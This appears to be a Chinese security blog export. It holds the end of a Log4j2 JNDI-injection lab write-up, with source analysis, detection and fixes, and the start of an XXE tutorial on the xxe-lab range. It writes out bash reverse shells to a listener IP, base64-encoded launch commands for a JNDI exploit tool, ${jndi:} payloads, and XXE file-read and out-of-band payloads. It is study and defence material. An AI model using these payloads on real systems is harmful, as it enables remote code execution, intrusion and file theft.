ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp\n目前支持的所有 PayloadType 为\nDnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输ReverseShell: 用于 Linux 系统的反弹shell，方便使用TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shellTomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP HeaderShell: true, 推荐使用此方式SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shellWeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shellWeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shellJBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shellWebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell\n目前支持的所有 GadgetType 为\n1.URLDNS2.CommonsBeanutils13.CommonsBeanutils24.CommonsCollectionsK15.CommonsCollectionsK26.C3P07.Jdk7u218.Jre8u209.CVE_2020_255110CVE_2020_2883\nWebsphereBypass 中的 3 个动作：\n1.list：基于XXE查看目标服务器上的目录或文件内容2.upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录3.rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下）\n2. VPS部署ldap服务\n将JNDI注入工具传到vps服务器上并执行如下命令\n反弹shell指令：\nbash -i &gt;&amp; /dev/tcp/your-ip/自己设置的监听端口号 0&gt;&amp;1\n\nJNDI启动方法：\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  xxx.xxx.xxx.xxx\n\n这个地方是反弹shell指令经过base64编码后所得。这串代码里只需改此处和最后面服务器的IP\n-C是执行的bash命令，-c参数后面是执行的具体命令，用双引号引起来 -A 指服务器的IP\n\n将反弹shell指令base64编码后，将一整串启动JNDI代码在vps中运行\n这里使用\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A 124.220.233.26\n\n使用burpsuit抓包，替换payload\nrmi://124.220.233.26:1099/29h4wg$&#123;jndi:rmi://124.220.233.26:1099/29h4wg&#125; //记得url编码\n\n成功反弹shell\n\n\n找到flag\n0x06 Log4j2源码浅析\n\nLog4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。\n\n从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。\n我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包(这里是跟着文章走的，暂时不实操了，用脑子复现一波)\n&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;        &lt;version&gt;2.14.0&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;\n\n在工程目录resources下创建log4j2.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;error&quot;&gt;    &lt;appenders&gt;&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot; &gt;&lt;!--            配置Console的模式布局--&gt;            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;/&gt;        &lt;/Console&gt;    &lt;/appenders&gt;    &lt;loggers&gt;        &lt;root level=&quot;error&quot;&gt;            &lt;appender-ref ref=&quot;Console&quot;/&gt;        &lt;/root&gt;    &lt;/loggers&gt;&lt;/configuration&gt;\nlog4j2中包含两个关键组件LogManager和LoggerContext。LogManager是Log4J2启动的入口，可以初始化对应的LoggerContext。LoggerContext会对配置文件进行解析等其它操作。\n在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果\nimport org.apache.logging.log4j.LogManager;//导入所需的包这里导入了 Apache Log4j 2.x 的 LogManager 和 Logger 类。import org.apache.logging.log4j.Logger;//声明 Logger 对象，创建了一个静态的 Logger 对象 logger，使用 LogManager.getLogger() 方法初始化。//Logger 对象用于记录日志。public class log4j2Rce2 &#123;    private static final Logger logger = LogManager.getLogger(log4j2Rce2.class);    //上述静态对象的初始化：创建一个 Logger 对象，并将其与当前的 log4j2Rce2 类关联起来，以便在该类中记录日志。    public static void main(String[] args) &#123;        String a=&quot;$&#123;java:os&#125;&quot;;        logger.error(a);    &#125;&#125;//在 main 方法中，定义了一个字符串变量 a 并赋值为 &quot;$&#123;java:os&#125;&quot;。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。\n\n\n属性占位符之Interpolator插值器\n\nlog4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:$&#123;prefix:key&#125;。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示：\n\n详细信息可以查看官方文档。这些实现类存在于org.apache.logging.log4j.core.lookup包下。\n当参数占位符$&#123;prefix:key&#125;带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符$&#123;key&#125;没有prefix时，Interpolator则会从默认查找器中进行查询。如使用$&#123;jndi:key&#125;时，将会调用JndiLookup的lookup方法 使用jndi(javax.naming)获取value。如下图演示。\n\n\n模式布局\n\nlog4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有PatternLayout，也就是我们在配置文件中PatternLayout字段所指定的属性pattern的值%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n。 %msg表示所输出的消息，其它格式化字符所表示的意义可以查看官方文档。\n\nPatternLayout模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个List&lt;PatternConverter&gt;转换器列表和List&lt;FormattingInfo&gt;格式信息列表。在配置文件PatternLayout标签的pattern属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过PluginManager收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示：\n\n\n本次漏洞关键在于转换器名称msg对应的插件实例为MessagePatternConverter对于日志中的消息内容处理存在问题，这部分是攻击者可控的。MessagePatternConverter会将日志中的消息内容为$&#123;prefix:key&#125;格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。\n\n日志级别\n\nlog4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：fatal(致命的), error, warn, info, debug, trace(堆栈)。 log4j2还定义了一个内置的标准级别intLevel，由数值表示，级别越高数值越小。\n\n当日志级别（调用）大于等于系统设置的intLevel的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中&lt;root level=&quot;error&quot;&gt;值设置intLevel。当然我们也可以通过Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理：\n\n0x07 漏洞原理\n首先先来看一下网络上流传最多的payload\n$&#123;jndi:ldap://2lnhn2.ceye.io&#125;\n而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示\nimport org.apache.logging.log4j.Level;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.core.config.Configurator;public class Log4jTEst &#123;    public static void main(String[] args) &#123;        Logger logger = LogManager.getLogger(Log4jTEst.class);        logger.error(&quot;$&#123;jndi:ldap://2lnhn2.ceye.io&#125;&quot;);    &#125;&#125;\n直击漏洞本源，将断点断在org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java中的directEncodeEvent方法上，该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法。log4j2默认布局使用的是PatternLayout，如下图所示：\n\n继续跟进在encode中会调用toText方法，根据注释，该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。\n\n\n接下来会调用serializer.toSerializable，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，\n\n这里整理了一下调用的Converter\norg.apache.logging.log4j.core.pattern.DatePatternConverterorg.apache.logging.log4j.core.pattern.LiteralPatternConverterorg.apache.logging.log4j.core.pattern.ThreadNamePatternConverterorg.apache.logging.log4j.core.pattern.LevelPatternConverterorg.apache.logging.log4j.core.pattern.LoggerPatternConverterorg.apache.logging.log4j.core.pattern.MessagePatternConverter  //消息模式转换器org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverterorg.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter\n这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟\n\n在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符&quot;{&quot;，这三行代码中关键点在于最后一行\n\n这里我圈了几个重点，有助于理解Log4j2 为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示\n09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - $&#123;jndi:ldap://2lnhn2.ceye.io&#125;\n本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是$符号，也就是说$&#123;jndi:ldap://2lnhn2.ceye.io&#125;这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是$&#123;jndi:ldap://2lnhn2.ceye.io&#125;这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进\n\n经过一段的嵌套调用，来到Interpolator.lookup，这里会通过var.indexOf(PREFIX_SEPARATOR)判断&quot;:&quot;之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示\n\n那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示\n\n然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示\n\n说到这里，我们已经详细了解了logger.error()造成RCE的原理：\n前提是`MessagePatternConverter`会将日志中的消息内容为`$&#123;prefix:key&#125;`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。而偏偏是jndi引起漏洞的原因为：\t在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 $&#123;java:...&#125; 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。\n那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值intLevel记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：\n\n当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小\n\n\n跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示\n\n而这里日志优先级数值小于等于200的就只有&quot;error&quot;、“fatal”，这两个，所以logger.fatal()方法也可触发漏洞。但是&quot;warn&quot;、&quot;info&quot;等大于200的就触发不了了。\n但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;Configuration status=&quot;WARN&quot;&gt;   &lt;Appenders&gt;     &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;       &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;     &lt;/Console&gt;   &lt;/Appenders&gt;   &lt;Loggers&gt;     &lt;Root level=&quot;error&quot;&gt;       &lt;AppenderRef ref=&quot;Console&quot;/&gt;     &lt;/Root&gt;   &lt;/Loggers&gt; &lt;/Configuration&gt;\n所以只需要做一点简单的修改，将&lt;Root level=&quot;error&quot;&gt;中的error改成一个优先级比较低的，例如&quot;info&quot;这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration status=&quot;WARN&quot;&gt;    &lt;Appenders&gt;        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;        &lt;/Console&gt;    &lt;/Appenders&gt;    &lt;Loggers&gt;        &lt;Root level=&quot;info&quot;&gt;            &lt;AppenderRef ref=&quot;Console&quot;/&gt;        &lt;/Root&gt;    &lt;/Loggers&gt;&lt;/Configuration&gt;\n关于Jndi部分的远程类加载利用可以参考实验室往常的文章：Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解、JAVA JNDI注入知识详解\n0x08 入侵排查\n1. 日志排查\n攻击者在利用前通常采用dnslog方式进行扫描探测，对于常见利用方式可通过应用系统报错日志中对以下关键字进行排查。\n&quot;javax.naming.CommunicationException&quot;&quot;javax.naming.NamingException: problem generating object using object factory&quot;&quot;Error looking up JNDI resource&quot;\n2. 流量排查\n\n排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字}。\n排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。\n\n0x09 漏洞修复\n\n排查应用是否引入了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。尽快升级Apache Log4j2所有相关应用到最新的版本：https://github.com/apache/logging-log4j2\n缓解措施：\n\n添加 jvm 启动参数 -Dlog4j2.formatMsgNoLookups=true\n在应⽤程序的 classpath 下添加 log4j2.component.properties 配置⽂件⽂件， ⽂件内容：log4j2.formatMsgNoLookups=True\n移除 log4j-core 包中 JndiLookup 类⽂件并重启服务\n\n\n各大厂商针对log4j2漏洞应急方案集合：https://mp.weixin.qq.com/s/ZbzLc_N26lgUfvS-mM4R2g\n\n参考文章\n前置基础知识参考：https://blog.csdn.net/qq_43531669/article/details/123562530\n复现过程参考1：http://www.luckysec.cn/posts/e991b2d2.html#toc-heading-5\n复现过程参考2：https://blog.csdn.net/weixin_55843787/article/details/124707658?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=log4j2漏洞复现-vulfocus&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124707658.142^v91^insertT0,239^v12^insert_chatgpt&amp;spm=1018.2226.3001.4187\n复现过程参考3：https://paper.seebug.org/1789/#0x05\n绕过方法参考：https://www.freebuf.com/articles/network/316590.html\n","categories":["漏洞库"]},{"title":"浅析xxe漏洞","url":"/2023/07/29/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E/","content":"浅析xxe漏洞\n一、XML简介\nXML，即Extensible Markdown Language，可扩展标记语言的缩写。XML是一种允许用户对自己的标记语言进行定义的源语言，可以用于标记数据，定义数据类型。XML是标准通用标记语言，具有可扩展性好、内容与形式分离、语法要求严格、保值性好等优点。\nXML与HTML非常相似，但是XML的设计宗旨是用于传输数据，而HTML的设计宗旨是用于展示数据。XML的标签没有被预定义，因此我们可以自己定义标签。\n二、XML语法规则\n接下来，我们来讲解XML语法规则。\n（一）XML基本语法\n一个典型的XML文档如下所示：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;person&gt;&lt;name&gt;Bob&lt;/name&gt;&lt;age&gt;24&lt;/age&gt;&lt;address&gt;1-1-110&lt;/address&gt;&lt;country&gt;China&lt;/country&gt;&lt;major&gt;History&lt;/major&gt;&lt;/person&gt;\n在上述文档中，第一行是XML文档的头部声明，指明了XML文档的版本号和编码。XML对于头部声明并不严格要求，可有可无，但是一般最好写上头部声明。\n在XML文档中，必须存在一个根节点，根节点是其他所有节点的父节点，在上述文档中，根节点是person。在XML中，所有的标签必须成对出现，标签名区分大小写并且标签不能交叉。但是标签名称可以自行定义。\n（二）XML注释\nXML文档中可以使用注释，注释的使用格式如下所示：\n&lt;!--This is annotation--&gt;\n（三）XML属性\nXML支持在标签元素中定义属性，写法类似于HTML，示例如下所示：\n&lt;name len=&quot;3&quot;&gt;Bob&lt;/name&gt;\nXML规定，一个标签可以有多个属性，但是属性的值必须使用引号括起来。\n（四）XML特殊字符处理\nXML如果想表达特殊字符，有两种方法。\n第一种方法是使用转义字符，常用的转义字符如下表所示：\n\n第二种方式是使用CDATA区域，CDATA区域定义如下所示：\n&lt;![CDATA[【CDATA区域内容】]]&gt;\nXML规定，对CDATA区域内的所有特殊字符不进行解析。\n三、XML文档结构\nXML文档结构包括XML声明、DTD类型定义（可选）、文档元素，同时XXE漏洞和DTD文档相关，所以这里主要对DTD进行介绍。\n&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;\n四、DTD介绍\n文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。\n内部文档声名DTD:&lt;!DOCTYPE 根元素 [元素声明]&gt;外部文档声明DTD:&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;DTD文档中有很多重要的关键字如下：DOCTYPE（DTD的声明）ENTITY（实体的声明）SYSTEM、PUBLIC（外部资源申请）\n实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。\n1.1 内部实体声明\n内部声明采用如下格式定义：\n&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;\n声明之后就可以通过“&amp;实体名;”来获取，示例如下\n&lt;!DOCTYPE foo [&lt;!ENTITY test &quot;john&quot;&gt;]&gt;&lt;foo&gt;&lt;name&gt;&amp;test;&lt;/name&gt;&lt;/foo&gt;\n1.2 外部实体声明\nXXE 的产生正是外部实体引用的结果，可分为普通实体和参数实体。\n（1）普通实体声明格式如下：\n&lt;!ENTITY 实体名 SYSTEM &quot;URI&quot;&gt;或者&lt;!ENTITY 实体名 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;\n举个例子：\n&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;声明实体 xxe，用于读取 /etc/passwd 文件，然后通过 &amp;xxe; 来引用执行。\n（2）参数实体声明主要用于后续使用，与普通实体不同的是，它中间有百分号字符（%），其声明格式\n如下：\n&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;\n注意：\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用%实体名;引用(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体(3)和通用实体一样，参数实体也可以外部引用\n1.3 实体类介绍\n参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。\n参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。\n内部实体：&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;外部实体：&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;参数实体：&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;\n1.4 外部实体\n由于XXE漏洞主要是利用引入外部实体，而导致的漏洞，所以这里主要了解外部实体。而外部实体又分为很多的类型。这里面的类型一些是在之前比如文件包含等中提到的一些协议，以及未提及到的协议。\n  外部实体在DTD中使用\n&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;\n根据程序不同，能够引入的实体也是不同的，例如：\n\n上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有\n\n外部实体演示：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;foo&gt;        &lt;value&gt;&amp;content;&lt;/value&gt; &lt;/foo&gt;\n五、XXE漏洞基本介绍\n1.1 XXE漏洞基本概念\nXML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞。\n  XML就是传输和存储数据的一个类型。\n  XXE就是xml的漏洞注入的全称。\n1.2 XXE漏洞危害\nXXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\n1.3 XXE漏洞输出形式\nXXE漏洞的输出显示分为：有回显、无回显。\n  有回显就能够配合协议以及外部引入进行攻击。\n  无回显就需要配合外部引入-反向链接配合。\n1.4 XXE漏洞相关差异\nXML和HTML的差异\n  XML被设计为数据传输和存储数据，其焦点是数据的内容。\n  HTML被设计用来显示数据，其焦点是数据的外观。\n  HTML指在显示信息，而XML指在传输数据。\n六、XXE漏洞检测\n第一步检测XML是否会被成功解析：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;    &lt;root&gt;&amp;name;&lt;/root&gt;\n如果页面输出了my name is nMask，说明xml文件可以被解析。\n\n第二步检测服务器是否支持DTD引用外部实体：\n&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  &lt;!DOCTYPE ANY [  &lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt;  %name;  ]&gt;\n可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。\n\n如果支持引用外部实体，那么很有可能是存在xxe漏洞的。\n七、XXE漏洞测试\n在测试中所有的语句基本上的固定格式，也就是说构建的payload基本上只需要修改调用协议，以及相关的参加即可，其它的格式，都是固定的可以直接使用。\n这里由于某些工具没咋见过,我就先弄php的xxe吧\n1.1.有回显测试\n像之前提到的，如果有回显，那么就可以配合更多的协议或外部引入进行利用。那么这里就先简单测试一下有回显状态。\n1.1.2.有回显案例\n这里我们使用xxe-labs靶场。下载链接：https://github.com/c0ny1/xxe-lab\n1.1.1.1.测试回显位置\n通过测试，能够看到在admin位置是存在回显的，而后面的password位置的1234是没回显的。\n\n1.1.1.2.构建payload\n构建payload后，也是成功的读取到了文件。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY name SYSTEM &quot;file:///c://windows/win.ini&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n\n1.2.无回显测试\n参考：https://xz.aliyun.com/t/3357#toc-0\n  无回显的情况又称为blind xxe可以使用外带数据通道提取数据。而且在正常的环境下，服务器端通常都会把回显取消。因此我们解决该问题最好的办法就是使用外带的方式。\n  其实也就是测试是否支持DTD引用外部实体。\n1.2.1.无回显常规测试案例\n1.2.1.1.关闭报错及输出\n这里我们先把XXElabs靶场的输出及报错都关闭，模拟无回显情况。在账号上面添加一个error_reporting(0);，然后在下面的echo $result;前面添加一个//，即可模拟成功。\n1.2.1.2.抓包测试\n这里我们首先抓包进行测试，可以发现不在出现报错，以及原来显示的位置也不在显示。\n\n1.2.1.3.构建payload\n这里需要在外部搭建一台vps，无回显需要查看服务器的访问日志，当存在访问日志了，那么就可以证明是支持外部实体的，若不存在日志，则证明不支持外部实体，或者被WAF拦截。\npayload：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % shit SYSTEM &quot;http://192.168.10.50/1.txt&quot;&gt;%shit;]&gt;\n1.2.1.4.查看服务器日志\n这里去攻击者服务器上查看一下日志，可以看到在服务器的访问日志中，查看到是存在一条访问日志的，那么就可以证明是支持外部实体的。\n\n1.2.2.无回显DNSlog测试案例\n上面的常规测试是需要我们自己搭建一个vps来进行测试，那么如果在刚开始测试的时候，不方便把自己的服务器地址暴露出来怎么办？\n1.2.2.1.DNSlog方式\n通过DNSlog方式看服务器是否有DNS或者HTTP的请求。但是由于不确定因素以及处于安全角度来考虑使用外部的DNSlog不安全，那么可以使用burp中自带的有官方架设的默认公共服务器上的DNSlog服务器。\nDNSlog位置：\n点击copy to clipboard后(这一步就是复制了子域名)，随后粘贴子域名即可。当请求时就会在下面的窗口中显示相关的请求信息。同时这个窗口不能关闭，若关闭了，那么就会销毁相关的信息。\n\n1.2.2.2.构建payload\n其实这里的payload和之前的payload基本一致。这里需要注意的是，我们复制的子域名是没有http://的需要我们自己添加上去。所以修改下面的payload的时候只需要把http://后面的内容替换即可，设置好后，点击发送。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % d SYSTEM &quot;http://3nrivqeathjejd5mau53iamdk4qveq2f.oastify.com&quot;&gt;%d;]&gt;\n\n1.2.2.3.查看效果\n发送完成后，点击Poll now(现在调查)，当然也可以在复制子域名后就开始轮询，这边可能需要稍等一会就能显示出来，当看到结果后就可以判断是可以使用外部引入的。\n\n1.3.总结\n以上都是简单测试，以及了解相关的payload如何构建，下面才是真实的案例。\n八、任意文件读取\n所谓的任意文件读取，其实也就是读取受害者服务器中的敏感文件。这里同样分为无回显和有回显操作。这里我们使用xxe-labs靶场做演示。\n2.1.有回显案例\n2.1.1.抓包\n我们在打开靶场后，输入账号和密码后对其进行抓包，然后放到重放器中。当然这里的账号和密码随便输都行。\n2.1.2.构建payload\n我们通过构建的payload对Windows中的配置文件，进行读取，也是成功读取了。\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;\n\n2.2.无回显案例\n2.2.1.修改配置文件\n这里为了演示修改，我们把xxelabs中的报错和回显都关闭。\n2.2.2.测试是否回显\n通过测试发现是，无法回显了，这里需要注意，若你还是存在回显，那么刷新一些页面重新加载一下。\n\n2.2.3.构建payload\n准备一台攻击服务器，当然本地的使用虚拟机即可，并且开启服务器的访问日志。在根目录下创建一个evil.dtd文件。\n&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; send 